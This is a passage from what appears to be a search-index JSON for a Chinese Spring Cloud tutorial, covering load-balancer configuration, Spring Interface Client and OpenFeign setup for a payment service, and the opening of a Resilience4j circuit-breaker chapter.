\u4e2a\u670d\u52a1\u5b9e\u4f8b\u3002 \u8981\u5207\u6362\u7b97\u6cd5\uff0c\u5219\u8981\u4fee\u6539 ReactorLoadBalancer<ServiceInstance> \u7684\u914d\u7f6e\uff0c\u4f8b\u5982\uff0c public class CustomLoadBalancerConfiguration { @Bean ReactorLoadBalancer<ServiceInstance> randomLoadBalancer(Environment environment, LoadBalancerClientFactory loadBalancerClientFactory) { String name = environment.getProperty(LoadBalancerClientFactory.PROPERTY_NAME); return new RandomLoadBalancer(loadBalancerClientFactory .getLazyProvider(name, ServiceInstanceListSupplier.class), name); } } \u8fd9\u6837\u5c31\u5207\u6362\u5230\u4e86\u968f\u673a\u7b97\u6cd5\u3002","title":"\u8d1f\u8f7d\u5e73\u8861\u7b97\u6cd5"},{"location":"06/","text":"Spring Cloud \u901f\u6210 Ch6 Spring Interface Client \u4e0e OpenFeign REST \u670d\u52a1\u8c03\u7528 \u524d\u9762\u6211\u4eec\u4e00\u76f4\u4f7f\u7528\u7684\u662f RestTemplate \u6765\u8c03\u7528\u670d\u52a1\uff0c\u4f46\u662f RestTemplate \u592a\u9ebb\u70e6\u4e86\u3002\u56e0\u6b64\u6709\u4e86 Spring Interface Client \u3002\u6b63\u5982\u540d\u5b57\u6240\u793a\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u662f\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a Controller \u7684\u63a5\u53e3\uff0c\u7136\u540e\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u7684 Client \u6765\u8c03\u7528\u670d\u52a1\u3002 \u867d\u7136\u73b0\u5728 OpenFeign \u662f\u6700\u4e3b\u6d41\u7684\uff0c\u4f46\u5f88\u53ef\u60dc\uff0c\u5df2\u7ecf\u88ab Spring Cloud \u5b98\u65b9\u5f03\u7528\u4e86\u3002\u56e0\u6b64\u6211\u4eec\u8fd9\u91cc\u9996\u5148\u4ecb\u7ecd\u7684\u662f Spring Interface Client\u3002\u73b0\u5728\u5df2\u7ecf\u96c6\u6210\u5728\u4e86 Spring Framework \u4e2d\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u989d\u5916\u5f15\u5165\u4f9d\u8d56\u3002 Spring Framework REST Clients \u5728\u4ecb\u7ecd Spring Interface Client \u4e4b\u524d\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b Spring Framework \u4e2d \u6240\u6709\u7684 REST Clients \uff0c\u4e00\u5171\u6709 4 \u7c7b\u63a5\u53e3\u3002 Client\u63a5\u53e3 \u963b\u585e API \u98ce\u683c \u4f8b\u5b50 RestTemplate \u540c\u6b65 \u9762\u5411\u8d44\u6e90 javaRestTemplate.getForObject(\"http://example.com/hotels/{hotel}\", Hotel.class, \"42\"); WebClient \u975e\u963b\u585e \u51fd\u6570\u5f0f\uff08\u6d41\u5f0f\uff09 Mono<Hotel> hotel = webClient.get().uri(\"/hotels/{hotel}\", \"42\").retrieve().bodyToMono(Hotel.class); RestClient \u540c\u6b65 \u51fd\u6570\u5f0f\uff08\u6d41\u5f0f\uff09 String result = restClient.get().uri(\"https://example.com\").retrieve().body(String.class); HTTP Interface \u53d6\u51b3\u4e8e\u4ee3\u7406\u7684\u5b9e\u73b0 \u51fd\u6570\u5f0f\uff08\u58f0\u660e\u5f0f\uff09 Hotel hotel = service.getHotel(\"42\"); \u4ece\u4e0a\u9762\u7684\u8868\u683c\u4e0d\u96be\u770b\u51fa\uff0cHTTP Interface \u662f\u5199\u8d77\u6765\u6700\u723d\u7684\uff0c\u4f46\u662f\u5b83\u672c\u8d28\u4e0a\u4ee3\u7406\u4e86\u4e00\u4e2a Client\uff0c\u5728 Spring \u63d0\u4f9b\u7684\u4e24\u4e2a Client \u4e2d\uff0c\u6027\u80fd\u4e0a\u66f4\u597d\u7684\u662f WebClient\u3002 \u4f46\u662f\uff0c\u6bcf\u4e2aClient \u63a5\u53e3\u4e0d\u53ea\u6709\u4e00\u4e2a\u5b9e\u73b0\u3002\u6bd4\u5982\uff0c RestTemplate \u9ed8\u8ba4\u4f7f\u7528 SimpleClientHttpRequestFactory \uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528 HttpComponentsClientHttpRequestFactory \u3002\u800c WebClient \u9ed8\u8ba4\u4f7f\u7528 ReactorNetty \uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528 Jetty \uff0c\u8fd8\u53ef\u4ee5\u7528 Apache \u7684 HttpClient \uff0cApache \u7684 Client \u6027\u80fd\u66f4\u597d\uff0c\u56e0\u6b64\u6211\u4eec\u5c06\u4f7f\u7528\u5b83\u3002\u652f\u6301\u7684\u5217\u8868\u89c1 \u6587\u6863 \u3002 \u6ce8\u610f\uff0cWebClient \u4e0d\u5728 Spring Web\uff0c\u800c\u662f\u5728 Spring WebFlux \u4e2d\u3002\u56e0\u6b64\u9700\u8981\u5f15\u5165 WebFlux\u3002\u6211\u4eec\u540e\u9762\u4f1a\u8bb2\u5230 WebFlux\uff0c\u4e0d\u8fc7\u73b0\u5728\u5148\u7528\u7740\u5c31\u597d\u3002 implementation 'org.springframework.boot:spring-boot-starter-webflux' Spring Interface Client \u7684\u58f0\u660e \u9996\u5148\u8981\u58f0\u660e\u4e00\u4e2a\u63a5\u53e3\uff0c\u8fd9\u4e2a\u63a5\u53e3\u63cf\u8ff0\u4e86\u670d\u52a1\u5e94\u5f53\u5982\u4f55\u53d1\u9001\u5e76\u5904\u7406 Http \u8bf7\u6c42\u3002\u8fd9\u91cc\u6211\u4eec\u8981\u4f7f\u7528\u6ce8\u89e3\u6765\u5b8c\u6210\u3002\u8fd9\u91cc\u7684\u58f0\u660e\u65b9\u6cd5\u548c Controller \u5f02\u66f2\u540c\u5de5\uff0c\u53ea\u662f\u53d8\u6210\u4e86 Exchange\u3002 \u5bf9\u4e8e\u6211\u4eec\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\uff0c package io.github.fingerbone; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseWrapper; import org.springframework.web.service.annotation.HttpExchange; import org.springframework.web.service.annotation.PostExchange; import org.springframework.web.service.annotation.GetExchange; import org.springframework.web.service.annotation.DeleteExchange; import org.springframework.web.service.annotation.PutExchange; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.PathVariable; import java.util.List; @HttpExchange(\"http://payment/payment\") public interface PaymentAPIIf { @PostExchange ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord); @GetExchange ResponseWrapper<List<PaymentRecord>> getAllPayments(); @GetExchange(\"/{id}\") ResponseWrapper<PaymentRecord> getPayment(@PathVariable Long id); @DeleteExchange(\"/{id}\") ResponseWrapper<Void> deletePayment(@PathVariable Long id); @PutExchange(\"/{id}\") ResponseWrapper<PaymentRecord> updatePayment(@PathVariable Long id, @RequestBody PaymentRecord paymentRecord); } \u4e0d\u8fc7\uff0c\u53ef\u4ee5\u628a HttpExchange \u7701\u6389\uff0c\u7136\u540e\u4e3a\u6bcf\u4e2a\u65b9\u6cd5\u6539\u8def\u5f84\uff0c\u8fd9\u6837\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 Spring Interface Client \u7684\u521b\u5efa \u8981\u521b\u5efa\u4e00\u4e2a Spring Interface Client\uff0c\u6709 4 \u6b65\u3002 \u521b\u5efa WebClient \u6ce8\u610f\uff0c\u6211\u4eec\u4f9d\u7136\u8981\u4f7f\u7528 Load Balancer\u3002\u5176\u5b83 Client \u4f7f\u7528 Load Balancer \u65b9\u6cd5\u89c1 \u6587\u6863 \u3002 @Bean @LoadBalanced WebClient.Builder webClientBuilder() { return WebClient.builder(); } @Bean WebClient webClient(@Autowired WebClient.Builder webClientBuilder) { return webClientBuilder.build(); } \u6ce8\u610f\uff0c @LoadBalanced \u53ea\u80fd\u52a0\u5728 WebClient \u548c RestClient \u7684 Builder \u4e0a \u8fd9\u6837\u5b50\u521b\u5efa\u7684\u662f\u9ed8\u8ba4\u7684 ReactorNetty \u3002\u6211\u4eec\u8981\u4f7f\u7528 Apache \u7684\uff0c\u56e0\u6b64\u8981\u6dfb\u52a0\u4f9d\u8d56\u3002\u56e0\u4e3a WebClient \u4f7f\u7528\u7684\u662f Reactor \uff0c\u56e0\u6b64\u8981\u7528 reactive \u7684 http core\u3002 implementation 'org.apache.httpcomponents.client5:httpclient5:5.3' implementation 'org.apache.httpcomponents.core5:httpcore5-reactive:5.2.5' @Bean @LoadBalanced WebClient.Builder webClientBuilder() { HttpAsyncClientBuilder clientBuilder = HttpAsyncClients.custom(); clientBuilder.setDefaultRequestConfig(RequestConfig.custom().build()); CloseableHttpAsyncClient client = clientBuilder.build(); ClientHttpConnector connector = new HttpComponentsClientHttpConnector(client); return WebClient.builder().clientConnector(connector); } @Bean WebClient webClient(@Autowired WebClient.Builder webClientBuilder) { return webClientBuilder.build(); } \u521b\u5efa Adapter @Bean WebClientAdapter webClientAdapter(@Autowired WebClient webClient) { return WebClientAdapter.create(webClient); } \u521b\u5efa HttpServiceProxyFactory @Bean HttpServiceProxyFactory httpServiceProxyFactory(@Autowired WebClientAdapter webClientAdapter) { return HttpServiceProxyFactory.builderFor(webClientAdapter).build(); } \u521b\u5efa Interface Client \u5bf9\u8c61 @Bean PaymentAPIIf paymentAPIIf(@Autowired HttpServiceProxyFactory httpServiceProxyFactory) { return httpServiceProxyFactory.createClient(PaymentAPIIf.class); } \u8fd9\u6837\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e86\u3002 OpenFeign \u7684\u4f7f\u7528 OpenFeign \u548c Spring Interface Client \u7684\u4f7f\u7528\u65b9\u6cd5\u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u662f\u58f0\u660e\u65b9\u6cd5\u4e0d\u540c\u3002 \u9996\u5148\u5f15\u5165\u4f9d\u8d56\uff0c implementation 'org.springframework.cloud:spring-cloud-starter-openfeign' implementation 'org.apache.httpcomponents.client5:httpclient5:5.3' implementation 'io.github.openfeign:feign-hc5' \u540e\u9762\u4e24\u4e2a\u662f\u7528\u6765\u5f00\u542f Apache \u7684 HttpClient \u7684\u3002\u53ea\u8981\u5728 application.yml \u4e2d\u914d\u7f6e\uff0c spring: cloud: openfeign: httpclient: hc5: enabled: true \u5373\u53ef\u3002\u5982\u679c\u4f7f\u7528\u9ed8\u8ba4 Client\uff0c\u53ef\u4ee5\u4e0d\u914d\u7f6e\u3002 \u7136\u540e\uff0c\u9700\u8981\u5728\u542f\u52a8\u7c7b\u4e0a\u52a0\u4e0a @EnableFeignClients \uff0c @EnableFeignClients @SpringBootApplication public class PaymentServiceApplication { public static void main(String[] args) { SpringApplication.run(PaymentServiceApplication.class, args); } } \u73b0\u5728\u5c31\u53ef\u4ee5\u521b\u5efa\u63a5\u53e3\u4e86\uff0c package io.github.fingerbone.api; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseWrapper; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.*; import java.util.List; @FeignClient(name = \"payment-service\", path = \"/payment\") public interface PaymentApi { @PostMapping ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord); @GetMapping ResponseWrapper<List<PaymentRecord>> getAllPayments(); @GetMapping(\"/{id}\") ResponseWrapper<PaymentRecord> getPayment(@PathVariable(\"id\") Long id); @DeleteMapping(\"/{id}\") ResponseWrapper<Void> deletePayment(@PathVariable(\"id\") Long id); @PutMapping(\"/{id}\") ResponseWrapper<PaymentRecord> updatePayment(@PathVariable(\"id\") Long id, @RequestBody PaymentRecord paymentRecord); } \u4e0e Spring Interface Client \u4e0d\u540c\u7684\u662f\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u521b\u5efa Client \u5bf9\u8c61\uff0c\u800c\u662f\u76f4\u63a5\u6ce8\u5165\u5373\u53ef\u3002 @Autowired PaymentApi paymentApi; \u5373\u53ef\u3002","title":"Http Interface Client \u4e0e OpenFeign"},{"location":"06/#spring-cloud-ch6-spring-interface-client-openfeign-rest","text":"\u524d\u9762\u6211\u4eec\u4e00\u76f4\u4f7f\u7528\u7684\u662f RestTemplate \u6765\u8c03\u7528\u670d\u52a1\uff0c\u4f46\u662f RestTemplate \u592a\u9ebb\u70e6\u4e86\u3002\u56e0\u6b64\u6709\u4e86 Spring Interface Client \u3002\u6b63\u5982\u540d\u5b57\u6240\u793a\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u662f\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a Controller \u7684\u63a5\u53e3\uff0c\u7136\u540e\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u7684 Client \u6765\u8c03\u7528\u670d\u52a1\u3002 \u867d\u7136\u73b0\u5728 OpenFeign \u662f\u6700\u4e3b\u6d41\u7684\uff0c\u4f46\u5f88\u53ef\u60dc\uff0c\u5df2\u7ecf\u88ab Spring Cloud \u5b98\u65b9\u5f03\u7528\u4e86\u3002\u56e0\u6b64\u6211\u4eec\u8fd9\u91cc\u9996\u5148\u4ecb\u7ecd\u7684\u662f Spring Interface Client\u3002\u73b0\u5728\u5df2\u7ecf\u96c6\u6210\u5728\u4e86 Spring Framework \u4e2d\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u989d\u5916\u5f15\u5165\u4f9d\u8d56\u3002","title":"Spring Cloud \u901f\u6210 Ch6 Spring Interface Client \u4e0e OpenFeign REST \u670d\u52a1\u8c03\u7528"},{"location":"06/#spring-framework-rest-clients","text":"\u5728\u4ecb\u7ecd Spring Interface Client \u4e4b\u524d\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b Spring Framework \u4e2d \u6240\u6709\u7684 REST Clients \uff0c\u4e00\u5171\u6709 4 \u7c7b\u63a5\u53e3\u3002 Client\u63a5\u53e3 \u963b\u585e API \u98ce\u683c \u4f8b\u5b50 RestTemplate \u540c\u6b65 \u9762\u5411\u8d44\u6e90 javaRestTemplate.getForObject(\"http://example.com/hotels/{hotel}\", Hotel.class, \"42\"); WebClient \u975e\u963b\u585e \u51fd\u6570\u5f0f\uff08\u6d41\u5f0f\uff09 Mono<Hotel> hotel = webClient.get().uri(\"/hotels/{hotel}\", \"42\").retrieve().bodyToMono(Hotel.class); RestClient \u540c\u6b65 \u51fd\u6570\u5f0f\uff08\u6d41\u5f0f\uff09 String result = restClient.get().uri(\"https://example.com\").retrieve().body(String.class); HTTP Interface \u53d6\u51b3\u4e8e\u4ee3\u7406\u7684\u5b9e\u73b0 \u51fd\u6570\u5f0f\uff08\u58f0\u660e\u5f0f\uff09 Hotel hotel = service.getHotel(\"42\"); \u4ece\u4e0a\u9762\u7684\u8868\u683c\u4e0d\u96be\u770b\u51fa\uff0cHTTP Interface \u662f\u5199\u8d77\u6765\u6700\u723d\u7684\uff0c\u4f46\u662f\u5b83\u672c\u8d28\u4e0a\u4ee3\u7406\u4e86\u4e00\u4e2a Client\uff0c\u5728 Spring \u63d0\u4f9b\u7684\u4e24\u4e2a Client \u4e2d\uff0c\u6027\u80fd\u4e0a\u66f4\u597d\u7684\u662f WebClient\u3002 \u4f46\u662f\uff0c\u6bcf\u4e2aClient \u63a5\u53e3\u4e0d\u53ea\u6709\u4e00\u4e2a\u5b9e\u73b0\u3002\u6bd4\u5982\uff0c RestTemplate \u9ed8\u8ba4\u4f7f\u7528 SimpleClientHttpRequestFactory \uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528 HttpComponentsClientHttpRequestFactory \u3002\u800c WebClient \u9ed8\u8ba4\u4f7f\u7528 ReactorNetty \uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528 Jetty \uff0c\u8fd8\u53ef\u4ee5\u7528 Apache \u7684 HttpClient \uff0cApache \u7684 Client \u6027\u80fd\u66f4\u597d\uff0c\u56e0\u6b64\u6211\u4eec\u5c06\u4f7f\u7528\u5b83\u3002\u652f\u6301\u7684\u5217\u8868\u89c1 \u6587\u6863 \u3002 \u6ce8\u610f\uff0cWebClient \u4e0d\u5728 Spring Web\uff0c\u800c\u662f\u5728 Spring WebFlux \u4e2d\u3002\u56e0\u6b64\u9700\u8981\u5f15\u5165 WebFlux\u3002\u6211\u4eec\u540e\u9762\u4f1a\u8bb2\u5230 WebFlux\uff0c\u4e0d\u8fc7\u73b0\u5728\u5148\u7528\u7740\u5c31\u597d\u3002 implementation 'org.springframework.boot:spring-boot-starter-webflux'","title":"Spring Framework REST Clients"},{"location":"06/#spring-interface-client","text":"\u9996\u5148\u8981\u58f0\u660e\u4e00\u4e2a\u63a5\u53e3\uff0c\u8fd9\u4e2a\u63a5\u53e3\u63cf\u8ff0\u4e86\u670d\u52a1\u5e94\u5f53\u5982\u4f55\u53d1\u9001\u5e76\u5904\u7406 Http \u8bf7\u6c42\u3002\u8fd9\u91cc\u6211\u4eec\u8981\u4f7f\u7528\u6ce8\u89e3\u6765\u5b8c\u6210\u3002\u8fd9\u91cc\u7684\u58f0\u660e\u65b9\u6cd5\u548c Controller \u5f02\u66f2\u540c\u5de5\uff0c\u53ea\u662f\u53d8\u6210\u4e86 Exchange\u3002 \u5bf9\u4e8e\u6211\u4eec\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\uff0c package io.github.fingerbone; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseWrapper; import org.springframework.web.service.annotation.HttpExchange; import org.springframework.web.service.annotation.PostExchange; import org.springframework.web.service.annotation.GetExchange; import org.springframework.web.service.annotation.DeleteExchange; import org.springframework.web.service.annotation.PutExchange; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.PathVariable; import java.util.List; @HttpExchange(\"http://payment/payment\") public interface PaymentAPIIf { @PostExchange ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord); @GetExchange ResponseWrapper<List<PaymentRecord>> getAllPayments(); @GetExchange(\"/{id}\") ResponseWrapper<PaymentRecord> getPayment(@PathVariable Long id); @DeleteExchange(\"/{id}\") ResponseWrapper<Void> deletePayment(@PathVariable Long id); @PutExchange(\"/{id}\") ResponseWrapper<PaymentRecord> updatePayment(@PathVariable Long id, @RequestBody PaymentRecord paymentRecord); } \u4e0d\u8fc7\uff0c\u53ef\u4ee5\u628a HttpExchange \u7701\u6389\uff0c\u7136\u540e\u4e3a\u6bcf\u4e2a\u65b9\u6cd5\u6539\u8def\u5f84\uff0c\u8fd9\u6837\u4e5f\u662f\u53ef\u4ee5\u7684\u3002","title":"Spring Interface Client \u7684\u58f0\u660e"},{"location":"06/#spring-interface-client_1","text":"\u8981\u521b\u5efa\u4e00\u4e2a Spring Interface Client\uff0c\u6709 4 \u6b65\u3002","title":"Spring Interface Client \u7684\u521b\u5efa"},{"location":"06/#webclient","text":"\u6ce8\u610f\uff0c\u6211\u4eec\u4f9d\u7136\u8981\u4f7f\u7528 Load Balancer\u3002\u5176\u5b83 Client \u4f7f\u7528 Load Balancer \u65b9\u6cd5\u89c1 \u6587\u6863 \u3002 @Bean @LoadBalanced WebClient.Builder webClientBuilder() { return WebClient.builder(); } @Bean WebClient webClient(@Autowired WebClient.Builder webClientBuilder) { return webClientBuilder.build(); } \u6ce8\u610f\uff0c @LoadBalanced \u53ea\u80fd\u52a0\u5728 WebClient \u548c RestClient \u7684 Builder \u4e0a \u8fd9\u6837\u5b50\u521b\u5efa\u7684\u662f\u9ed8\u8ba4\u7684 ReactorNetty \u3002\u6211\u4eec\u8981\u4f7f\u7528 Apache \u7684\uff0c\u56e0\u6b64\u8981\u6dfb\u52a0\u4f9d\u8d56\u3002\u56e0\u4e3a WebClient \u4f7f\u7528\u7684\u662f Reactor \uff0c\u56e0\u6b64\u8981\u7528 reactive \u7684 http core\u3002 implementation 'org.apache.httpcomponents.client5:httpclient5:5.3' implementation 'org.apache.httpcomponents.core5:httpcore5-reactive:5.2.5' @Bean @LoadBalanced WebClient.Builder webClientBuilder() { HttpAsyncClientBuilder clientBuilder = HttpAsyncClients.custom(); clientBuilder.setDefaultRequestConfig(RequestConfig.custom().build()); CloseableHttpAsyncClient client = clientBuilder.build(); ClientHttpConnector connector = new HttpComponentsClientHttpConnector(client); return WebClient.builder().clientConnector(connector); } @Bean WebClient webClient(@Autowired WebClient.Builder webClientBuilder) { return webClientBuilder.build(); }","title":"\u521b\u5efa WebClient"},{"location":"06/#adapter","text":"@Bean WebClientAdapter webClientAdapter(@Autowired WebClient webClient) { return WebClientAdapter.create(webClient); }","title":"\u521b\u5efa Adapter"},{"location":"06/#httpserviceproxyfactory","text":"@Bean HttpServiceProxyFactory httpServiceProxyFactory(@Autowired WebClientAdapter webClientAdapter) { return HttpServiceProxyFactory.builderFor(webClientAdapter).build(); }","title":"\u521b\u5efa HttpServiceProxyFactory"},{"location":"06/#interface-client","text":"@Bean PaymentAPIIf paymentAPIIf(@Autowired HttpServiceProxyFactory httpServiceProxyFactory) { return httpServiceProxyFactory.createClient(PaymentAPIIf.class); } \u8fd9\u6837\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e86\u3002","title":"\u521b\u5efa Interface Client \u5bf9\u8c61"},{"location":"06/#openfeign","text":"OpenFeign \u548c Spring Interface Client \u7684\u4f7f\u7528\u65b9\u6cd5\u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u662f\u58f0\u660e\u65b9\u6cd5\u4e0d\u540c\u3002 \u9996\u5148\u5f15\u5165\u4f9d\u8d56\uff0c implementation 'org.springframework.cloud:spring-cloud-starter-openfeign' implementation 'org.apache.httpcomponents.client5:httpclient5:5.3' implementation 'io.github.openfeign:feign-hc5' \u540e\u9762\u4e24\u4e2a\u662f\u7528\u6765\u5f00\u542f Apache \u7684 HttpClient \u7684\u3002\u53ea\u8981\u5728 application.yml \u4e2d\u914d\u7f6e\uff0c spring: cloud: openfeign: httpclient: hc5: enabled: true \u5373\u53ef\u3002\u5982\u679c\u4f7f\u7528\u9ed8\u8ba4 Client\uff0c\u53ef\u4ee5\u4e0d\u914d\u7f6e\u3002 \u7136\u540e\uff0c\u9700\u8981\u5728\u542f\u52a8\u7c7b\u4e0a\u52a0\u4e0a @EnableFeignClients \uff0c @EnableFeignClients @SpringBootApplication public class PaymentServiceApplication { public static void main(String[] args) { SpringApplication.run(PaymentServiceApplication.class, args); } } \u73b0\u5728\u5c31\u53ef\u4ee5\u521b\u5efa\u63a5\u53e3\u4e86\uff0c package io.github.fingerbone.api; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseWrapper; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.*; import java.util.List; @FeignClient(name = \"payment-service\", path = \"/payment\") public interface PaymentApi { @PostMapping ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord); @GetMapping ResponseWrapper<List<PaymentRecord>> getAllPayments(); @GetMapping(\"/{id}\") ResponseWrapper<PaymentRecord> getPayment(@PathVariable(\"id\") Long id); @DeleteMapping(\"/{id}\") ResponseWrapper<Void> deletePayment(@PathVariable(\"id\") Long id); @PutMapping(\"/{id}\") ResponseWrapper<PaymentRecord> updatePayment(@PathVariable(\"id\") Long id, @RequestBody PaymentRecord paymentRecord); } \u4e0e Spring Interface Client \u4e0d\u540c\u7684\u662f\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u521b\u5efa Client \u5bf9\u8c61\uff0c\u800c\u662f\u76f4\u63a5\u6ce8\u5165\u5373\u53ef\u3002 @Autowired PaymentApi paymentApi; \u5373\u53ef\u3002","title":"OpenFeign \u7684\u4f7f\u7528"},{"location":"07/","text":"Spring Cloud \u901f\u6210 Ch7 Resilience4j \u670d\u52a1\u7194\u65ad\u548c\u964d\u7ea7 Resilience4j \u662f\u5bf9 Circuit Breaker \u7684\u5b9e\u73b0\uff0c\u5b83\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u9650\u6d41\u3001\u91cd\u8bd5\u3001\u8d85\u65f6\u7b49\u3002Resilience4j \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u7194\u65ad\u5e93\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u7194\u65ad\u5668\u5b9e\u73b0\uff0c\u6bd4\u5982 RateLimiter\u3001Retry\u3001Bulkhead\u3001CircuitBreaker \u7b49\u3002 \u53ef\u4ee5\u5c06 Circuit Breaker \u6bd4\u4f5c\u4e00\u4e2a\u4fdd\u9669\u4e1d\uff0c\u5f53\u670d\u52a1\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u4fdd\u9669\u4e1d\u4f1a\u65ad\u5f00\uff0c\u907f\u514d\u670d\u52a1\u96ea\u5d29\uff0c\u628a\u6545\u969c\u9650\u5236\u5728\u6700\u5c0f\u8303\u56f4\u5185\u3002 \u867d\u7136\u9898\u76ee\u53eb\u670d\u52a1\u7194\u65ad\u548c\u964d\u7ea7\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a Resilience4j \u63d0\u4f9b\u7684\u529f\u80fd\u8fdc\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u5b83\u8fd8\u63d0\u4f9b\u4e86\u9650\u6d41\u3001\u91cd\u8bd5\u3001\u8d85\u65f6\u7b49\u529f\u80fd\u3002 \u539f\u7406 Circuit Breaker \u7684\u539f\u7406\u662f\u901a\u8fc7\u72b6\u6001\u673a\u6765\u5b9e\u73b0\u7684\uff0c\u5b83\u6709\u4e09\u79cd\u72b6\u6001\uff1a\u95ed\u8def\uff0c\u5f00\u8def\uff0c\u534a\u5f00\u8def\uff0c\u7c7b\u6bd4\u7535\u8def\u7684\u5f00\u8def\u3001\u95ed\u8def\u3002 \u95ed\u8def\uff1a\u95ed\u8def\u5373\u6b63\u5e38\u72b6\u6001\uff0c\u670d\u52a1\u6b63\u5e38\uff0c\u8bf7\u6c42\u6b63\u5e38\u5904\u7406\u3002\u5982\u679c\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u5f00\u8def\u72b6\u6001\u3002 \u5f00\u8def\uff1a\u5f00\u8def\u72b6\u6001\u4e0b\uff0cCircuit Breaker \u4f1a\u62d2\u7edd\u6240\u6709\u8bf7\u6c42\uff0c\u76f4\u5230\u8d85\u65f6\u65f6\u95f4\u5230\u8fbe\u3002\u8d85\u65f6\u65f6\u95f4\u5230\u8fbe\u540e\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u534a\u5f00\u8def\u72b6\u6001\u3002 \u534a\u5f00\u8def\uff1a\u534a\u5f00\u8def\u72b6\u6001\u4e0b\uff0cCircuit Breaker \u4f1a\u5141\u8bb8\u4e00\u4e2a\u8bf7\u6c42\u901a\u8fc7\uff0c\u5982\u679c\u8bf7\u6c42\u6210\u529f\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u95ed\u8def\u72b6\u6001\uff0c\u5426\u5219\u4f1a\u7ee7\u7eed\u4fdd\u6301\u5f00\u8def\u72b6\u6001\u3002 \u5bf9\u4e8e\u670d\u52a1\u51fa\u73b0\u95ee\u9898\u7684\u6807\u51c6\uff0c\u53ef\u4ee5\u6309\u65f6\u95f4\u6ed1\u52a8\u7a97\u53e3\u6216\u8005\u8bf7\u6c42\u6b21\u6570\u6765\u5224\u65ad\u3002\u524d\u8005\u5373\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\uff0c\u8bf7\u6c42\u5931\u8d25\u7684\u6b21\u6570\u8d85\u8fc7\u4e00\u5b9a\u9608\u503c\uff0c\u5c31\u8ba4\u4e3a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff1b\u540e\u8005\u5373\u5728\u4e00\u5b9a\u6b21\u6570\u7684\u8bf7\u6c42\u4e2d\uff0c\u5931\u8d25\u7684\u6b21\u6570\u8d85\u8fc7\u4e00\u5b9a\u9608\u503c\uff0c\u5c31\u8ba4\u4e3a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\u3002 \u670d\u52a1\u7194\u65ad\u4e0e\u964d\u7ea7 Circuit Breaker \u914d\u7f6e\u53c2\u6570 \u9996\u5148\u4ecb\u7ecd\u51e0\u4e2a\u91cd\u8981\u7684\u53c2\u6570\u3002\u5168\u90e8\u53c2\u6570\u53c2\u8003 \u6587\u6863 \u3002 failureRateThreshold\uff1a\u5931\u8d25\u7387\u9608\u503c\uff0c\u5f53\u8bf7\u6c42\u5931\u8d25\u7387\u8d85\u8fc7\u8fd9\u4e2a\u9608\u503c\u65f6\uff0cCircuit Breaker \u4f1a\u6253\u5f00\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u767d\u5206\u6bd4\uff0c\u6bd4\u5982 50 \u8868\u793a 50%\u3002 slowCallDurationThreshold\uff1a\u6162\u8c03\u7528\u6301\u7eed\u65f6\u95f4\u9608\u503c\uff0c\u5f53\u8bf7\u6c42\u7684\u6162\u8c03\u7528\u6301\u7eed\u65f6\u95f4\u8d85\u8fc7\u8fd9\u4e2a\u9608\u503c\u65f6\uff0c\u88ab\u89c6\u4e3a\u6162\u8c03\u7528\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u6beb\u79d2\uff0c\u6bd4\u5982 1000 \u8868\u793a 1 \u79d2\u3002 slowCallRateThreshold\uff1a\u6162\u8c03\u7528\u7387\u9608\u503c\uff0c\u5f53\u8bf7\u6c42\u7684\u6162\u8c03\u7528\u7387\u8d85\u8fc7\u8fd9\u4e2a\u9608\u503c\u65f6\uff0cCircuit Breaker 